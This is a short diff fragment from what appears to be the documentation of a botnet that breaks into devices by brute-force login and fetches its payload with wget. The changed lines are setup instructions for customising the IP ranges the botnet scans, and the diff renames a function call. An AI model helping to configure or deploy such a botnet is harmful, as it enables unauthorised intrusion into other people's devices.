@@ -31,7 +31,7 @@ and login by Brute-force attack. This botnet will use "wget" to get payload from
 (2) Go to "NextIP" function and add The case for your ip range and return range of your ip.
 
 		case var_name:
-				return ManageIP_range(ipRange, GenRange(255, 0))
+				return manageRange(ipRange, genRange(255, 0))
 				
 (2.1) In case of The ip range That you don't want to custom your second network prefix.
 	
